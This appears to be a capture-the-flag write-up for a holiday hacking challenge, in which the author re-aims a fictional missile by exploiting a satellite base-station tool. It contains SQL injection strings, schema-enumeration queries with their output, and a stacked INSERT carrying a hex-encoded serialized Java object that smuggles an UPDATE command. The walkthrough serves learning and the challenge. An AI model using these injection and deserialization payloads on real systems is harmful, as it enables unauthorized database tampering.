# OBJECTIVE 22 - Missile Diversion #

## OBJECTIVE : ##
>Thwart Jack’s evil plan by re-aiming his missile at the Sun.
#  

## HINTS: ##
<details>
  <summary>Hints provided for Objective 22</summary>
  
>-  Wombley thinks he may have left the admin tools open. I should check for those if I get stuck.
</details>

#  

## PROCEDURE : ##
This challenge continues where OBJECTIVE 21 left off.  We are still connected to the **NanoSat MO Base Station Tool** and need to figure out how to re-aim a missile that is currently aimed at Earth.

After some playing-around with the **NanoSat MO Base Station Tool** I found that by going to the **Action Service** tab, selecting the `Debug` action,  clicking on **submitAction** and clicking **Edit** I was able to pass on SQLI test strings that seemed to be parsed by the program.  For example if I enter `OR 1=1;` as value string then go to the **Parameter Service** tab,  select `Debug` and click on **getValue**, I get the output:  `rawValue: VERSION() OR 1=1: 1`

Using this method I was able to get some interesting information which I enumarted in the following table:

SQLI | String	Response
:---|:---
OR 1=1;|	VERSION() OR 1=1:1
;	VERSION():| 11.2.2-MariaDB-1:11.2.2+maria~ubu2204
=1 order by 1,2|	Unknow column ‘2’ in ‘order clause’
=1 order by 1	|VERSION()=1:0
; select table_name from information_schema.tables|	Output is very long and needs to be captured using Wireshark as per the procedure followed in Objective 20 – Camera Access but gives us a list of all the tables in the schema which is very useful to enumerate the rest.
; select * from target_coordinates|	Id: 1 \| lat: 1.14514 \| lng: -145.262
; select * from pointing_mode	|id: 1 \| numerical_mode: 0 \|
; select * from pointing_mode_to_string|	Id: 1 \| numerical_mode: 0 \| str_mode: Earth Point Mode \| str_desc: When pointing_mode is 0, targeting system applies the target_coorinates to earth. \| id: 2 \| numerical_mode: 1 \| str_mode: Sun Point Mode \| str_desc: When pointing_mode is 1, targeting system points at the sun, ignoring the coordinates.
; select * from messaging	|id: 1 \| msg_type: RedAlphaMsg \| msg_data: RONCTTLA \| id: 2 \| msg_type: MsgAuth \| msg_data: 220040DL \| id: 3 \| msg_type: LaunchCode \| msg_data: DLG2209TVX \| id: 4 \| msg_type: LaunchOrder \| msg_data: CONFIRMED \| id: 5 \| msg_type: TargetSelection \| msg_data: CONFIRMED \| id: 6 \| msg_type: TimeOnTargetSequence \| msg_data: COMPLETE \| id: 7 \| msg_type: YieldSelection \| msg_data: COMPLETE \| id: 8 \| msg_type: MissileDownlink \| msg_data: ONLINE \| id: 9 \| msg_type: TargetDownlinked \| msg_data: FALSE \| 
; select * from sattelite_query	|**[JAVA CODE](Code/SatelliteQueryFileFolderUtility.java)**
; show columns from satellite_query;|	COLUMN_NAME: jid \| COLUMN_TYPE: int(11) \| IS_NULLABLE: NO \| COLUMN_KEY: PRI \| COLUMN_DEFAULT: null \| EXTRA: auto_increment \|COLUMN_NAME: object \| COLUMN_TYPE: blob \| IS_NULLABLE: YES \| COLUMN_KEY: COLUMN_NAME: results \| COLUMN_TYPE: text \| IS_NULLABLE: YES \| COLUMN_KEY:convertedValue: null COLUMN_DEFAULT: null \| EXTRA: \| COLUMN_DEFAULT: null \| EXTRA: \|
; show columns from pointing_mode|	COLUMN_NAME: id \| COLUMN_TYPE: int(11) \| IS_NULLABLE: NO \| COLUMN_KEY: PRI \| COLUMN_DEFAULT: null \| EXTRA: auto_increment \| COLUMN_NAME: numerical_mode \| COLUMN_TYPE: int(11) \| IS_NULLABLE: YES \| COLUMN_KEY: \| COLUMN_DEFAULT: null \| EXTRA: \|

First of all – hats off for including a [Wargames reference](https://i.gifer.com/7Mzk.gif) in the `messaging` table.  Secondly by using SQL Injection it was possible to retrieve a lot of useful information.  Namely:
-	The coordinates are useless to us and we do nto need to be concerned with them.
-	The table `pointing_mode` determines where the missile is pointed and by changing the value stored under column `numerical_mode` from `0` to `1` we can re-aim the missiles to the sun.
-	The table `sattelite_query` has some kind of query in the object column and under results there is [some Java code](Code/SatelliteQueryFileFolderUtility.java)

I pasted the string I found in `satellite_query` as well as the java code in [ChatGPT](https://chat.openai.com/) and from there I learned that the string in the object column is a **serialized java object**.  The Java code retrieved from the results column takes this serialised object as it’s input and parses a SQL query, SQL update or retrieves a file.

I prompted ChatGPT to create a java program that would accept a SQL command as input and would use the [Java code I retrieved](Code/SatelliteQueryFileFolderUtility.java) to prepare a hex string that can be fed back to it as an input.  Using this program I created a hex string for the SQL command ``UPDATE pointing_mode SET numerical_mode = 1 WHERE Id = 1``.
I then included the resulting serialized hex in a SQL command to add it as a new entry in `satellite_query` and I pasted this into the `debug` field similarly to how I exfiltrated the database info earlier:
```
; INSERT INTO satellite_query (jid, object)
VALUES (2, 0xaced00057372001f536174656c6c697465517565727946696c65466f6c6465725574696c69747912d4f68d0eb392cb0200035a0007697351756572795a000869735570646174654c000f706174684f7253746174656d656e747400124c6a6176612f6c616e672f537472696e673b7870010174003855504441544520706f696e74696e675f6d6f646520534554206e756d65726963616c5f6d6f6465203d2031205748455245204964203d2031);
```
(NOTE the preceeding `;` and the `0x` before the hex string)

This updated the value of `numerical_mode` in `pointing_mode` from `0` to `1` thus pointing the missile safely towards the sun and away from the Earth.

![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2023/assets/60655500/74e7b554-6a65-421d-8e81-f577bad6a9ab)


This write-up is almost ridiculously short for a challenge that took me **close to seven hours** to complete!  

